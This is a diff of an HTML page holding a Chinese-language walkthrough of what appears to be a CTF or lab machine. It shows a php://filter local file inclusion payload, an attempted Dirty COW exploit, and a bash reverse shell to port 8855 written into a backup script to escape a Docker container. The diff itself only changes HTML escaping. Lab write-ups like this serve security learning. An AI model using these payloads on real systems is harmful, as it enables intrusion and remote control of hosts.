@@ -147,7 +147,7 @@
 <p>绕了一圈发现是错误是文件读取上的错误，不能识别文件，说明截断失败，再关注一下php版本发现是7系统，php已经修复%00的文件截断。所以需要一个不截断正常去读取的操作，没有在意php版本导致绕一圈。</p>
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724152733228.png" alt="image-20200724152733228"></p>
 <p>调用的时候发现一个报错是多次调用导致重复声明，说明index包含很可能是成功的。</p>
-<p>利用php协议来读取文件，尝试php://filter，可以读取到文件内容</p>
+<p>利用php协议来读取文件，尝试php:&#x2F;&#x2F;filter，可以读取到文件内容</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;?view&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;dog&#x2F;..&#x2F;index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200724153220725.png" alt="image-20200724153220725"></p>
@@ -220,7 +220,7 @@
 <p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200727155322648.png" alt="image-20200727155322648"></p>
 <p>再试一手CVE-2016-5195，<a target="_blank" rel="noopener" href="https://github.com/scumjr/dirtycow-vdso">https://github.com/scumjr/dirtycow-vdso</a></p>
 <p>发现还是不行，查看一下系统上有没有可以利用的文件</p>
-<p>在<code>/opt/</code>下找到一个backups目录，里面有一个备份的sh脚本。执行的是/root/container目录的备份，但是docker主机并没有这个目录，所以可能是外部主机上的目录。尝试修改反弹shell</p>
+<p>在<code>/opt/</code>下找到一个backups目录，里面有一个备份的sh脚本。执行的是&#x2F;root&#x2F;container目录的备份，但是docker主机并没有这个目录，所以可能是外部主机上的目录。尝试修改反弹shell</p>
 <pre class="line-numbers language-none"><code class="language-none">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.6.xx.xx&#x2F;8855 0&gt;&amp;1&quot; &gt; &#x2F;opt&#x2F;backups&#x2F;backup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>里面的tar包也可以看到。确实是docker的web代码。寻思可能是外部主机上的定时脚本，不过等了半天也没反应。</p>
